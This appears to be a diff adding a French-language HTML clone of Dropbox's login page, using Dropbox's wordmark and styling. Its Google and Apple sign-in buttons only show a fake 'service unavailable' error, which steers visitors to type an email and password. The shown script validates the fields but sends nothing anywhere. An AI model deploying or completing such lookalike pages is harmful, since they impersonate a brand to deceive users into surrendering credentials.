@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connexion ou inscription - Dropbox</title>
+  <link rel="icon" type="image/png" href="Images/favicon2.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap" rel="stylesheet">
+  <style>
+
+    @font-face {
+      font-family : "SharpGroteskBook20";
+      src : url(fonts/Sharp_Grotesk/SharpGrotesk-Book20.otf)
+    }
+
+    @font-face {
+      font-family: "LiberationSansNarrow";
+      src: url(fonts/Liberation-Sans-Narrow/LiberationSans-Regular.ttf);
+    }
+
+    body {
+      font-family: "Inter", sans-serif;
+      background: #fff;
+      margin: 0;
+      padding: 0;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #e4e4e4;
+    }
+
+    .logoETsvgDrop {
+      display:flex;
+      align-items: center;
+    }
+
+    .logoBleu {
+      height: 48px;
+      margin:0;
+      display: block;
+    }
+
+    .svgdropbox{
+      height: 22px;
+      display:block;
+    }
+
+    .no-style-link {
+    all:unset;
+    display:flex;
+    align-items:center;
+    line-height:1;
+    gap: 12px;
+
+    }
+
+    .globe {
+      margin-right: 3%;
+    }
+
+    .container {
+      max-width: 350px;
+      max-height: 325.33px;
+      margin: 40px auto;
+      margin-top:72px;
+      padding: 0 16px;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 24px;
+      margin-bottom: 24px;
+      font-weight: 400;
+      line-height: 30px;
+      font-family: "SharpGroteskBook20"
+    }
+
+    .auth-button {
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 12px 16px;
+      font-size: 14px;
+      background: #ffffff;
+      border: 1px solid #ccc;
+      cursor: pointer;
+      margin-bottom: 15px;
+      border-radius: 0;
+      transition: background 0.2s;
+    }
+
+    #auth-button1{
+      border-radius:3px;
+    }
+
+    #auth-button2{
+      border-radius:3px;
+      font-family: "LiberationSansNarrow";
+    }
+
+    .auth-button img {
+      position: absolute;
+      left: 16px;
+      height: 20px;
+    }
+
+    .auth-button:hover {
+      background: #e0e0e0;
+    }
+
+    .auth-button:focus{
+      border-color :#9b0032;
+    }
+
+    .separator {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+    }
+
+    .separator::before,
+    .separator::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #ccc;
+    }
+
+    .separator span {
+      margin: 0 16px;
+      font-weight: normal; 
+      color: #000;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      color: #666;
+      font-size: 14px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 16px;
+      font-size: 15px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+      color : #524a3ed1;
+      transition: border-color 0.2s;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #1a73e8; /* Bleu utilisé dans la 2ème image */
+      box-shadow: 0 0 0 3px #3983e3;
+    }
+
+    input.invalid {
+      border-color:#9B0032;
+    }
+
+    .error-message1 {
+      color: #9b0032;
+      font-size: 10px;
+      margin-top: -10px;
+      margin-bottom: 5px;
+      display: none;
+    }
+
+    .auth-button:focus + .error-message1 {
+      display: block;
+    }
+
+    .error-message2 {
+      color: #9B0032;
+      font-size: 10px;
+      margin-top: 4px;
+      display: none;
+    }
+
+    .error-message2.active {
+      display: block;
+    }
+    
+    .error-message3 {
+      color:#9b0032;
+      font-size : 10px;
+      margin-top : 4px;
+      display:none;
+    }
+
+    .error-message3.active {
+      display:block;
+    }
+
+    .continue-btn, .connect-btn {
+      width: 100%;
+      padding: 18px;
+      font-size: 16px;
+      background: #0061ff;
+      color: white;
+      border: none;
+      border-radius: 15px;
+      margin-top: 40px;
+      cursor: pointer;
+      font-weight:bold;
+      transition: background 0.2s;
+    }
+
+    
+    .continue-btn:hover, .connect-btn:hover {
+      background: #004bcc;
+    }
+
+    input:hover {
+      border-color: #000;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .back-link {
+      display: inline-block;
+      margin-bottom: 16px;
+      text-decoration: underline;
+      color: black;
+      cursor: pointer;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #aaa;
+      margin-top: 50px;
+    }
+
+    .retour-link {
+        display: inline-flex;
+        align-items:center;
+        text-decoration:none;
+        color:black;
+        font-size: 16px;
+        cursor:pointer;
+    }
+
+    .retour-icon {
+        margin-right:6px;
+        flex-shrink: 0;
+        transition:transform 0.2s ease; /* Animation fluide */
+    }
+
+    .retour-text {
+        text-decoration:underline;
+        text-underline-offset: 2px;
+    }
+
+    .retour-link:hover .retour-icon{
+        transform: translateX(-3px); /* Déplacement vers la gauche */
+    }
+
+    .password-container {
+      position: relative;
+      margin-bottom: 10px;
+      margin-top: 7px;
+    }
+
+    .password-container:focus-within{
+        border-color:#1a73e8;
+        box-shadow: 0 0 0 3px #1a73e8;
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    input#password {
+        height: 40px;
+        padding-right: 40px; /* pour ne pas que le texte chevauche l'icône */
+        box-sizing: border-box;
+    }
+
+    .toggle-password {
+      position: absolute;
+      margin-top: 2.5px;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+    }
+
+    .error-message4 {
+      color: #9B0032;
+      font-size: 10px;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .error-message4.active {
+      display: block;
+    }
+
+    .link {
+      color: #0061ff;
+      font-size: 12px;
+      font-weight:375;
+      text-decoration: none;
+    }
+
+    .custom-checkbox-container {
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      margin-top :24px;
+  
+    }
+
+    .custom-checkbox {
+      width: 20px;
+      height: 20px;
+      border: 1px solid black;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 8px;
+      transition: background-color 0.2s;
+    }
+
+    .checkbox-label{
+        color: black;
+        font-weight: 500;
+        font-size: 16px;
+        margin-top:6px;
+    }
+
+    .check-icon {
+      display: none;
+    }
+
+    .custom-checkbox[aria-checked="true"] .check-icon {
+      display: block;
+    }
+  </style>
+  
+<!--______________________________________________________________________________________________________________________-->
+</head>
+<body>
+  <div class="header">
+    <div class="logoETsvgDrop">
+      <a class="no-style-link" href="https://www.dropbox.com/">
+        <img src="https://cdn.brandfetch.io/idY3kwH_Nx/w/400/h/400/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B" class="logoBleu" alt="Dropbox Logo" href="https://www.dropbox.com/">
+        <svg class="svgdropbox" width="93" height="22" viewBox="0 0 93 22" fill="currentColor" xmlns="http://www.w3.org/2000/svg" data-testid="dropbox-wordmark">
+          <path fill-rule="evenodd" clip-rule="evenodd" d="M79.0027 17.1956L83.8346 10.6951L79.3777 4.55302H83.1948L85.7762 8.38529L88.3798 4.55302H92.1748L87.6517 10.6731L92.4175 17.1956H88.6666L85.7321 13.0709L82.8859 17.1956H79.0027Z"></path>
+          <path fill-rule="evenodd" clip-rule="evenodd" d="M66.8534 11.1269C66.8534 15.2995 69.1327 17.5177 73.1703 17.5177C76.9474 17.5177 79.5089 15.2995 79.5089 11.1269V10.7755C79.5089 6.55884 76.904 4.23092 73.1703 4.23092C69.5234 4.23092 66.8534 6.51492 66.8534 10.7755V11.1269ZM76.2184 11.1278C76.2184 13.4426 75.0645 14.6993 73.1702 14.6993C71.2978 14.6993 70.1438 13.4206 70.1438 11.1278V10.8192C70.1438 8.35003 71.3631 7.04932 73.192 7.04932C75.0427 7.04932 76.2184 8.43822 76.2184 10.8192V11.1278Z"></path>
+          <path fill-rule="evenodd" clip-rule="evenodd" d="M55.8155 14.8834C56.5002 16.5079 57.8695 17.5177 59.9678 17.5177C63.2144 17.5177 65.3347 15.1468 65.3347 10.932V10.5588C65.3347 6.34398 63.0819 4.25851 60.0561 4.23656C58.0462 4.23656 56.6327 5.1366 55.926 6.78302V0.285156H52.6793V17.1884H55.5505L55.8155 14.8834ZM62.0443 10.9622C62.0443 13.4682 60.8862 14.6993 58.9851 14.6993C57.1715 14.6993 55.9697 13.3363 55.9697 10.9622V10.6984C55.9697 8.52216 57.2152 7.04932 59.0288 7.04932C60.7769 7.04932 62.0443 8.32431 62.0443 10.6545V10.9622Z"></path>
+          <path fill-rule="evenodd" clip-rule="evenodd" d="M38.252 4.56791V21.544H41.493V15.1865C42.1765 16.6635 43.5215 17.5672 45.5499 17.5672C48.5484 17.5672 50.9075 15.3849 50.9075 11.1967V10.844C50.9075 6.56753 48.7909 4.23092 45.5499 4.23092C43.4553 4.23092 42.0442 5.31105 41.3608 6.94227L41.03 4.56791H38.252ZM47.6171 11.1161C47.6171 13.4463 46.4152 14.6993 44.536 14.6993C42.7224 14.6993 41.5424 13.2924 41.5424 11.0502V10.8083C41.5424 8.45621 42.7661 7.04932 44.6016 7.04932C46.3278 7.04932 47.6171 8.30233 47.6171 10.8303V11.1161Z"></path>
+          <path fill-rule="evenodd" clip-rule="evenodd" d="M23.8248 11.1269C23.8248 15.2995 26.1258 17.5177 30.1634 17.5177C33.9405 17.5177 36.4802 15.2995 36.4802 11.1269V10.7755C36.4802 6.55884 33.897 4.23092 30.1634 4.23092C26.5165 4.23092 23.8248 6.51492 23.8248 10.7755V11.1269ZM33.1898 11.1278C33.1898 13.4426 32.0141 14.6993 30.1416 14.6993C28.2692 14.6993 27.1152 13.4206 27.1152 11.1278V10.8192C27.1152 8.35003 28.3345 7.04932 30.1634 7.04932C32.0141 7.04932 33.1898 8.43822 33.1898 10.8192V11.1278Z"></path>
+          <path fill-rule="evenodd" clip-rule="evenodd" d="M14.9659 17.1956H18.2854V11.3877C18.2854 8.70383 18.9493 7.75786 21.6934 7.75786H23.0654V4.39197H22.2466C19.8788 4.39197 18.5731 5.42593 18.0641 7.44987L17.6436 4.55228H14.9659V17.1956Z"></path>
+          <path fill-rule="evenodd" clip-rule="evenodd" d="M0.285583 1.57357V17.1956H6.31261C10.2386 17.1956 13.1942 14.9151 13.1942 9.87184V8.7974C13.1942 3.77605 10.0622 1.57357 6.22439 1.57357H0.285583ZM3.57601 4.39197H6.08687C8.35455 4.39197 9.90375 5.82472 9.90375 8.97678V9.79235C9.90375 12.9444 8.39945 14.3772 6.19913 14.3772H3.57601V4.39197Z"></path>
+        </svg>
+      </a>
+    </div>
+    <svg viewBox="0 0 24 24" fill="none" class="globe" width="24" height="24" role="presentation" focusable="false">
+      <path d="M11.75 4C6.535 4 4 6.535 4 11.75s2.535 7.75 7.75 7.75 7.75-2.535 7.75-7.75S16.965 4 11.75 4Zm5.714 4.5H14.87a9.237 9.237 0 0 0-.623-2.711A4.454 4.454 0 0 1 17.463 8.5ZM18 11.75c.002.586-.042 1.171-.133 1.75H14.97c.022-.579.03-1.167.03-1.75s-.008-1.171-.03-1.75h2.897c.09.579.135 1.164.133 1.75ZM11.75 18c-.616 0-1.3-.41-1.598-3h3.196c-.298 2.59-.982 3-1.598 3Zm-1.712-4.5c-.024-.524-.038-1.1-.038-1.75 0-.65.014-1.226.038-1.75h3.424c.024.524.038 1.1.038 1.75 0 .65-.014 1.226-.038 1.75h-3.424ZM5.5 11.75c-.002-.586.042-1.171.133-1.75H8.53c-.022.579-.03 1.167-.03 1.75s.008 1.171.03 1.75H5.633a11.074 11.074 0 0 1-.133-1.75Zm6.25-6.25c.616 0 1.3.41 1.598 3h-3.196c.298-2.59.982-3 1.598-3Zm-2.497.289A9.236 9.236 0 0 0 8.63 8.5H6.036a4.454 4.454 0 0 1 3.217-2.711ZM6.036 15H8.63c.07.93.28 1.844.623 2.711A4.453 4.453 0 0 1 6.037 15Zm8.21 2.711A9.237 9.237 0 0 0 14.87 15h2.594a4.454 4.454 0 0 1-3.217 2.711Z" fill="currentColor" vector-effect="non-scaling-stroke"></path>
+    </svg>
+
+  </div>
+
+  <div class="container">
+    <div id="email-step">
+      <h1>Connexion ou inscription</h1>
+
+      <button class="auth-button" id="auth-button1">
+        <img src="https://www.svgrepo.com/show/475656/google-color.svg" alt="Google">
+        Continuer avec Google
+      </button>
+      <div class="error-message1" id="error-msg1">Service momentanément indisponible, veuillez réessayer plus tard.</div>
+
+      <button class="auth-button" id="auth-button2">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+        Continuer avec Apple
+      </button>
+      <div class="error-message1" id="error-msg1bis">Service momentanément indisponible, veuillez réessayer plus tard.</div>
+
+      <div class="separator"><span>ou</span></div>
+
+      <form id="email-form" action="" method="POST" autocomplete="off" onsubmit="handleEmailSubmit(event)">
+        <label for="email" style="font-size:13px; font-weight:300 " >E-mail</label>
+        <input type="text" id="email" placeholder="">
+        <p class="error-message2" id="error-msg2">Saisissez une adresse e-mail valide.</p>
+        <p class="error-message3" id="error-msg3">Saisissez une adresse e-mail.</p>
+        <input type="submit" value="Continuer" class="continue-btn">
+        
+      </form>
+    </div>
+<!--______________________________________________________________________________________________________________________-->
+
+    <div id="password-step" class="hidden">
+        <a href="#" class="retour-link" onclick="goBack(); return false;">
+            <svg viewBox="0 0 24 24" fill="none" class="retour-icon flipped" width="24" height="24" role="presentation" focusable="false">
+                <path d="M19 11.75H7m5.25-6.5L6 11.75l6.25 6.5" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" vector-effect="non-scaling-stroke"/>
+            </svg>
+            <span class="retour-text">Retour</span>
+        </a>
+
+      <h1>Ravis de vous revoir !</h1>
+
+      <p id="email-display" style="text-align: center; font-weight: 450; margin-bottom:32px;">Connexion avec campagnecyclo@gmail.com</p>
+      <label for="password" style="font-size: 12px;font-weight:350">Mot de passe</label>
+      
+      <form action="" method="POST" autocomplete="off" onsubmit="verifyPassword(event)">
+        <div class="password-container">
+          <div class="input-wrapper">
+
+            <input type="password" id="password">
+
+            <!-- Mdp Visible Ou Non -->
+            <span class="toggle-password" onclick="togglePasswordVisibility()">
+              <svg id="eye-open" viewBox="0 0 24 24" fill="none" width="24" height="24" role="presentation" style="display: none;">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M6 19.203 20.142 5.06 19.082 4l-2.697 2.696a7.809 7.809 0 0 0-4.054-1.135c-5.411 0-8.066 5.446-8.177 5.677L4 11.561l.154.322c.068.143 1.106 2.273 3.163 3.882l-2.378 2.377L6 19.202Zm2.398-4.52c-1.443-1.077-2.356-2.495-2.717-3.122.62-1.081 2.878-4.5 6.65-4.5 1.114 0 2.096.298 2.943.746L13.703 9.38a2.32 2.32 0 0 0-1.372-.318 2.321 2.321 0 0 0-2.5 2.5 2.321 2.321 0 0 0 .318 1.371l-1.751 1.752Z" fill="currentColor" />
+                <path d="M12.331 16.06a6.09 6.09 0 0 1-1.091-.097L10 17.203c.71.225 1.487.358 2.331.358 5.412 0 8.067-5.446 8.177-5.678l.154-.322-.154-.323c-.052-.109-.667-1.37-1.866-2.677l-1.07 1.07c.7.77 1.173 1.519 1.409 1.93-.622 1.081-2.88 4.5-6.65 4.5Z" fill="currentColor" />
+              </svg>
+              <svg id="eye-closed" viewBox="0 0 24 24" fill="none" width="24" height="24" role="presentation">
+                <path d="M12 9.5A2.321 2.321 0 0 0 9.5 12a2.321 2.321 0 0 0 2.5 2.5 2.32 2.32 0 0 0 2.5-2.5A2.322 2.322 0 0 0 12 9.5Z" fill="currentColor" vector-effect="non-scaling-stroke"></path>
+                <path d="M20.177 11.678C20.067 11.446 17.41 6 12 6c-5.412 0-8.067 5.446-8.177 5.678L3.669 12l.153.322C3.933 12.554 6.588 18 12 18c5.411 0 8.066-5.446 8.177-5.678L20.33 12l-.154-.322ZM12 16.5c-3.77 0-6.03-3.42-6.65-4.5.62-1.081 2.878-4.5 6.65-4.5 3.771 0 6.028 3.418 6.65 4.5-.622 1.082-2.88 4.5-6.65 4.5Z" fill="currentColor" vector-effect="non-scaling-stroke"></path>
+              </svg>
+            </span>
+          </div>
+          <p class="error-message4" id="error-msg4">Saisissez votre mot de passe.</p>
+        </div>
+        
+
+        <a href="https://www.dropbox.com/forgot" class="link">Mot de passe oublié ?</a>
+
+        <div class="custom-checkbox-container">
+          <div class="custom-checkbox" onclick="toggleCheckbox(this)" aria-checked="true">
+           <!-- Case Memoriser (SVG) -->
+            <svg class="check-icon" viewBox="0 0 24 24" width="20" height="20" fill="none">
+              <rect width="24" height="24" rx="0" fill="#000"></rect>
+              <path d="M6 12.5L10 16.5L18 7.5" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+            </svg>
+          </div>
+          <label class="checkbox-label">Mémoriser</label>
+        </div>
+
+        <input type="submit" value="Se connecter" class="connect-btn">
+      </form>
+    </div>
+
+    <div class="footer" id="footer"></div>
+  </div>
+<!--______________________________________________________________________________________________________________________-->
+
+  <script>
+    const emailInput = document.getElementById("email");
+    const passwordInput = document.getElementById("password");
+    const errorMsg2 = document.getElementById("error-msg2");
+    const errorMsg3 = document.getElementById("error-msg3");
+    const errorMsg4 = document.getElementById("error-msg4");
+
+    emailInput.addEventListener("focus", () => {
+      emailInput.classList.remove("invalid");
+      errorMsg2.classList.remove("active");
+      errorMsg3.classList.remove("active");
+    });    
+
+    emailInput.addEventListener("blur", () => {
+      if (emailInput.value.trim() === "") {
+        emailInput.classList.remove("invalid");
+        errorMsg2.classList.remove("active");
+      }
+    });
+
+    passwordInput.addEventListener("focus", () => {
+      passwordInput.classList.remove("invalid");
+      errorMsg4.classList.remove("active");
+    });  
+
+    function handleEmailSubmit(event) {
+      event.preventDefault(); // Empêche le rechargement de la page
+
+      const value = emailInput.value.trim();
+      const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
+
+      if (!isValid && value !== "") {
+        emailInput.classList.add("invalid");
+        errorMsg2.classList.add("active");
+        return;
+      } else if (value === "") {
+        emailInput.classList.add("invalid");
+        errorMsg3.classList.add("active");
+        return;
+      }
+
+      // Si email est valide, passe à l'étape mot de passe
+      emailInput.classList.remove("invalid");
+      errorMsg2.classList.remove("active");
+      errorMsg3.classList.remove("active");
+      document.getElementById("email-step").classList.add("hidden");
+      document.getElementById("password-step").classList.remove("hidden");
+      document.getElementById("email-display").textContent = `Connexion avec ${value}`;
+    }
+
+
+    function goBack() {
+      document.getElementById("password-step").classList.add("hidden");
+      document.getElementById("email-step").classList.remove("hidden");
+      document.getElementById("footer").innerHTML = "";
+    }
+
+    function togglePasswordVisibility() {
+      const passwordInput = document.getElementById("password");
+      const eyeOpen = document.getElementById("eye-open");
+      const eyeClosed = document.getElementById("eye-closed");
+
+      const isPasswordHidden = passwordInput.type === "password";
+      passwordInput.type = isPasswordHidden ? "text" : "password";
+      eyeOpen.style.display = isPasswordHidden ? "inline" : "none";
+      eyeClosed.style.display = isPasswordHidden ? "none" : "inline";
+    }
+
+    function toggleCheckbox(el) {
+      const isChecked = el.getAttribute("aria-checked") === "true";
+      el.setAttribute("aria-checked", !isChecked);
+    }
+
+    function verifyPassword(event){
+      event.preventDefault(); // Empêche le rechargement de la page
+      const value = passwordInput.value.trim();
+
+      if (value === "") {
+        passwordInput.classList.add("invalid");
+        errorMsg4.classList.add("active");
+        return;
+      }
+      else {
+        passwordInput.classList.remove("invalid");
+        errorMsg4.classList.remove("active");
+      }
+
+    }
+  </script>
+</body>
+</html>
